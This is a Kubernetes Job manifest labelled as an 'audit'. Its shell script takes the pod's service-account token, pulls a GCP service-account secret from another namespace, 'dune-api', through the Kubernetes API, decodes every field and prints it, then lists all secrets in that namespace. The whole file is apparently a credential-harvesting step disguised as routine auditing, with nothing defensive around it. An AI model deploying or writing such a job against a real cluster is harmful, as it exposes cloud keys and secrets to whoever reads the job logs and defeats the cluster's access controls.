apiVersion: batch/v1
kind: Job
metadata:
  name: dune-gcp-v1
  namespace: default
spec:
  ttlSecondsAfterFinished: 600
  template:
    spec:
      serviceAccountName: n8n-audit-sa
      restartPolicy: Never
      containers:
      - name: audit
        image: alpine/curl:latest
        command: ["/bin/sh","-c"]
        args:
        - |
          apk add -q jq openssl
          KUBE_TOKEN=$(cat /var/run/secrets/kubernetes.io/serviceaccount/token)
          API="https://kubernetes.default.svc"
          CA="/var/run/secrets/kubernetes.io/serviceaccount/ca.crt"
          
          echo "=GCP_SA_SECRET="
          SECRET=$(curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/dune-api/secrets/gcpsm-secret")
          echo "$SECRET" | jq '.data'
          
          # Decode the GCP SA JSON key
          SA_JSON=$(echo "$SECRET" | jq -r '.data["gcp-sa.json"] // .data["key.json"] // .data | keys[0]' 2>/dev/null)
          echo "SA JSON key field: $SA_JSON"
          
          # Try to decode all fields
          echo "$SECRET" | jq -r '.data | to_entries[] | "\(.key): \(.value | @base64d | .[0:200])"' 2>/dev/null
          echo "=END_GCP_SA="
          
          echo "=ALL_DUNE_API_SECRETS="
          curl -sk --cacert $CA -H "Authorization: Bearer $KUBE_TOKEN" \
            "$API/api/v1/namespaces/dune-api/secrets" | jq '.items[] | {name:.metadata.name, keys:(.data|keys)}'
          echo "=END_SECRETS="